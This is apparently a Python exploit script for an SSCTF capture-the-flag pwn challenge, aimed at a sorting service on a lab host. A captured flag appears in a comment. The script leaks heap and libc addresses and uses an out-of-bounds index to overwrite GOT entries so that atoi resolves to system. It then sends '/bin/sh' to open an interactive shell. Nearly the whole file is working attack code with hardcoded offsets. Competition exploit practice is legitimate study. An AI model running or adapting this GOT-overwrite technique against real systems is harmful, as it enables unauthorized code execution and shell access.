#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.23"
#port = 8888
#SSCTF{eaf05181170412ab19d74ba3d5cf15b9}

host = "pwn.lab.seclover.com"
port = 11111

sock = make_conn(host,port)


atoi_got = 0x0804d020
def initsort(sock,array,size=None):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"sort")
    recvuntil(sock,":")
    if size :
        array.append("a")
        sendline(sock,str(size))
    else :
        sendline(sock,str(len(array)))
    for i in array :
        recvuntil(sock,":")
        sendline(sock,str(i))

def history(sock):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"history")
    data = recvuntil(sock,"Data")
    return data

def clear(sock):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"clear")

def update(sock,index,val):
    recvuntil(sock,"Choose:")
    sendline(sock,"2")
    recvuntil(sock,":")
    sendline(sock,str(index))
    recvuntil(sock,":")
    sendline(sock,str(val))

def reload(sock,index):
    recvuntil(sock,"_CMD_$")
    sendline(sock,"reload")
    recvuntil(sock,":")
    sendline(sock,str(index))

def sort(sock):
    recvuntil(sock,"Choose:")
    sendline(sock,"3")

def quit(sock):
    recvuntil(sock,"Choose:")
    sendline(sock,"7")


def query(sock,index):
    recvuntil(sock,"Choose:")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,str(index))
    data = recvuntil(sock,"Sort Menu:")
    return data


fuck = []
for i in range(32):
    fuck.append(0x7fffffff)

initsort(sock,fuck)
quit(sock)


initsort(sock,[1,1,1,1,1,1,1])
sort(sock)

data = query(sock,7)
heap = int(data.split()[-3].strip())
update(sock,7,atoi_got)
quit(sock)
print hex(heap)
atoiaddr = int(history(sock).split()[-2][:-1].strip())+0x100000000
#libc = atoiaddr - 0x2d4f0
libc = atoiaddr - 0x2d8e0
memcpy_got = 0x804d014
print hex(libc)
initsort(sock,[1,1,1,1,1,1,1])
sort(sock)
update(sock,0,-1)
update(sock,7,heap+0x2c)
quit(sock)
reload(sock,1)
update(sock,16367,memcpy_got-4)
quit(sock)

#system = libc + 0x3b160
system = libc + 0x3bc90
memcpy =0x8048746
strlen = 0x8048756
printf = 0x8048766
atoi = 0x8048776
initsort(sock,[memcpy,strlen,printf,atoi],20)
update(sock,3,system-0x100000000)
recvuntil(sock,"Choose:")
sendline(sock,"/bin/sh")
inter(sock)
